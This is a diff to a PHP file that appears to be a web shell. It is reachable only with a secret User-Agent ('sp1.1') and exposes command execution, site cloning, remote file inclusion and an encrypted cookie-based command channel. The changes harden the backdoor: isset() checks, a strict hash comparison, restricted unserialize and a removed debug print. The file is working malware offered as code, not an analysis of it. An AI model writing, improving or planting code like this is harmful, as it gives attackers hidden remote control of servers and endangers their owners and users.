@@ -363,7 +363,7 @@ function windows($com, $r)
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
-    if (!empty($_POST["cr"])) {
+    if (isset($_POST["cr"])) {
         $ns = null;
         $sk = null;
         $ad = null;
@@ -381,22 +381,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
             }
         }
         executeCommands($split, "0");
-    } elseif (!empty($_POST["clone"])) {
+    } elseif (isset($_POST["clone"])) {
         if (!empty($_POST["ROS"])) {
             $ROS = htmlentities($_POST["ROS"]);
         } else {
             $ROS = "";
         }
         cloner($_POST["clone"], $ROS);
-    } elseif (!empty($_POST["doInclude"])) {
+    } elseif (isset($_POST["doInclude"])) {
         remoteFileInclude($_POST["doInclude"]);
-    } elseif (!empty($_COOKIE["cb64"])) {
+    } elseif (isset($_COOKIE["cb64"])) {
         $aSX = explode(".", $_COOKIE['cb64']);
-        if (hash("sha512", $_COOKIE['jsessionid'], $binary=false) == $aSX[1]) {
+        if (hash("sha512", $_COOKIE['jsessionid'], $binary=false) === $aSX[1]) {
             $sp = explode('.', base64_decode($_COOKIE['jsessionid']));
             $final = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($sp[3], $sp[0], $sp[1], $sp[2]);
-            $axD = unserialize(base64_decode($final));
-            print_r($axD)."\n";
+            $axD = unserialize(base64_decode($final), ['allowed_classes'=> false]);
             b64($axD, $aSX[0]);
         }
     } elseif ($_SERVER['REQUEST_METHOD'] === "POST" && $_COOKIE['jsessionid']) {
